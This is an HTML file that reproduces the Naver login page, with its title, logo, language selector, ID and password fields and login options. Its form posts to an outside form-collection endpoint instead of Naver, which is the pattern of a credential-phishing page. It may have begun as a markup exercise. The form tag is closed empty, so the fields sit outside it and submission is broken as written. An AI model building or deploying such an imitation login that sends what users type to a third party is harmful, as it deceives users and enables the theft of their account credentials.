<!DOCTYPE html>
<html lang="ko-KR">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>네이버 로그인</title>
  <link rel="shortcut icon" href="./images/favicon.ico" type="image/x-icon" />
  <link rel="icon" href="./images/naver.png" type="image/x-icon"/>
  <link rel="apple-touch-icon" href="./images/naver.png" />
  <link rel="stylesheet" href="./css/index.css" />
</head>
<body>
  <div class="container">
    <header class="header">
      <h1 class="logo">
        <a href="/" class="logo__link">
          <img src="./images/logo.svg" srcset="./images/logo.svg" alt="네이버">
        </a>
      </h1>
      <div class="customSelect">
        <label for="selectLanguage" class="a11yHidden customSelect__label">언어선택</label>
        <select name="selectLanguage" id="selectLanguage" class="customSelect__select">
          <option value="ko">한국어</option>
          <option value="en">영어</option>
          <option value="jp">일본어</option>
        </select>
        <svg class="arrowDown" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" viewBox="0 0 1000 1000">
          <g>
            <path d="M500,820.7L10,281.9l93.3-102.6L500,615.4l396.7-436.1L990,281.9L500,820.7z"/>
          </g>
        </svg>
      </div>
    </header>
    <main class="main">
      <h2 class="a11yHidden">로그인</h2>
      <form action="https://formspree.io/f/mrgrplje" method="POST" class="loginForm"></form>
      <fieldset>
        <legend>로그인 폼</legend>
        <div class="loginForm__container">
          <div class="userEmail">
            <div class="formControl formControlUser">
              <label for="userEmail" class="a11yHidden formControl__label">아이디</label>
              <input class="formControl__input" type="email" id="userEmail" name="userEmail" required placeholder="아이디">
            </div>
            <span class="errorMessage">아이디는 이메일 형식이어야 합니다.</span>
          </div>
          <div class="userPassword is--invalid">
            <div class="formControl formControlUser">
              <label for="userPassword" class="a11yHidden formControl__label">비밀번호</label>
              <input class="formControl__input" type="password" id="userPassword" name="userPassword" required placeholder="비밀번호">
            </div>
            <span class="errorMessage">비밀번호는 10자리 이상 입력해주세요.</span>
          </div>
          <div class="userSelectInfo">
            <div class="formControl loginState">
              <input type="checkbox" class="formControl__checkbox loginState__checkbox customCheckbox" name="loginState" id="loginState">
              <label for="loginState" class="formControl__label loginState__label customCheckboxLabel">
                로그인 상태유지
              </label>
            </div>
            <a href="https://www.naver.com" class="ipSecurityLink" target="_blank" rel="noreferrer noopener">
              IP 보안
            </a>
            <div class="formControl ipSecurity">
              <input type="checkbox" aria-label="IP 보안" class="formControl__checkbox ipSecurity__checkbox" name="ipSecurity" id="ipSecurity">
              <label for="ipSecurity" class="formControl__label ipSecurity__label"></label>
            </div>
          </div>
          <div class="formControl loginButton">
            <button type="submit" class="formControl__button">
              로그인
            </button>
          </div>
        </div>
      </fieldset>
    </main>
  </div>
</body>
</html>
